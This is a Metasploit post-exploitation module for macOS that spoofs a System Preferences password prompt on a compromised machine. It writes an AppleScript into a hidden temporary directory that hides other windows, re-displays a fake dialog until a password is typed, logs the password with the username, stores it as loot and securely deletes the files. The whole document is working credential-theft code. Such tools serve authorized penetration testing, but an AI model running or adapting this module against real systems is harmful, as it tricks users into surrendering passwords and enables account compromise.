##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'OSX Password Prompt Spoof',
        'Description'   => %q{
          Presents a password prompt dialog to a logged-in OSX user.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
          'Joff Thyer <jsthyer[at]gmail.com>', # original post module
          'joev', # bug fixes
          'Peter Toth <globetother[at]gmail.com>' # bug fixes
        ],
        'Platform'      => [ 'osx' ],
        'References'    => [
          ['URL', 'http://blog.packetheader.net/2011/10/fun-with-applescript.html']
        ],
        'SessionTypes'  => [ "shell", "meterpreter" ]
      ))

    register_options([
      OptString.new(
        'TEXTCREDS',
        [
          true,
          'Text displayed when asking for password',
          'Type your password to allow System Preferences to make changes'
        ]
      ),
      OptString.new(
        'ICONFILE',
        [
          true,
          'Icon filename relative to bundle',
          'UserUnknownIcon.icns'
        ]
      ),
      OptString.new(
        'BUNDLEPATH',
        [
          true,
          'Path to bundle containing icon',
          '/System/Library/CoreServices/CoreTypes.bundle'
        ]
      ),
      OptInt.new('TIMEOUT', [true, 'Timeout for user to enter credentials', 60])
    ], self.class)
  end

#  def cmd_exec(str, args)
#    print_status "Running cmd '#{str} #{args}'..."
#    super
#  end

  # Run Method for when run command is issued
  def run
    if client.nil?
      print_error("Invalid session ID selected. Make sure the host isn't dead.")
      return
    end

    host = case session.type
    when /meterpreter/
      sysinfo["Computer"]
    when /shell/
      cmd_exec("/bin/hostname").chomp
    end

    print_status("Running module against #{host}")

    dir       = "/tmp/." + Rex::Text.rand_text_alpha((rand(8)+6))
    creds_osa = dir + "/" + Rex::Text.rand_text_alpha((rand(8)+6))
    pass_file = dir + "/" + Rex::Text.rand_text_alpha((rand(8)+6))

    username = cmd_exec("/usr/bin/whoami").strip
    cmd_exec("umask 0077")
    cmd_exec("/bin/mkdir #{dir}")

    # write the credentials script and run
    write_file(creds_osa,creds_script(pass_file))
    cmd_exec("osascript #{creds_osa}")

    print_status("Waiting for user '#{username}' to enter credentials...")

    timeout = ::Time.now.to_f + datastore['TIMEOUT'].to_i
    pass_found = false
    while (::Time.now.to_f < timeout)
      if file_exist?(pass_file)
        print_status("Password entered! What a nice compliant user...")
        pass_found = true
        break
      end
      Rex.sleep(0.5)
    end

    if pass_found
      password_data = read_file("#{pass_file}").strip
      print_good("password file contents: #{password_data}")
      passf = store_loot("password", "text/plain", session, password_data, "passwd.pwd", "OSX Password")
      print_good("Password data stored as loot in: #{passf}")
    else
      print_status("Timeout period expired before credentials were entered!")
    end

    print_status("Cleaning up files in #{host}:#{dir}")
    cmd_exec("/usr/bin/srm -rf #{dir}")
  end

  # applescript that displays the actual password prompt dialog
  def creds_script(pass_file)
    textcreds = datastore['TEXTCREDS']
    ascript = %Q{
set filename to "#{pass_file}"
set myprompt to "#{textcreds}"
set ans to "Cancel"
repeat
  try
    tell application "Finder"
      activate
      tell application "System Events" to keystroke "h" using {command down, option down}
      set d_returns to display dialog myprompt default answer "" with hidden answer buttons {"Cancel", "OK"} default button "OK" with icon path to resource "#{datastore['ICONFILE']}" in bundle "#{datastore['BUNDLEPATH']}"
      set ans to button returned of d_returns
      set mypass to text returned of d_returns
      if ans is equal to "OK" and mypass is not equal to "" then exit repeat
    end tell
  end try
end repeat
try
  set now to do shell script "date '+%Y%m%d_%H%M%S'"
    set user to do shell script "whoami"
  set myfile to open for access filename with write permission
  set outstr to now & ":" & user & ":" & mypass & "
"
  write outstr to myfile starting at eof
  close access myfile
on error
  try
    close access myfile
  end try
end try
    }
  end

  # Checks if the target is OSX Server
  def check_server
    cmd_exec("/usr/bin/sw_vers -productName").chomp  =~ /Server/
  end

  # Enumerate the OS Version
  def get_ver
    # Get the OS Version
    cmd_exec("/usr/bin/sw_vers", "-productVersion").chomp
  end
end
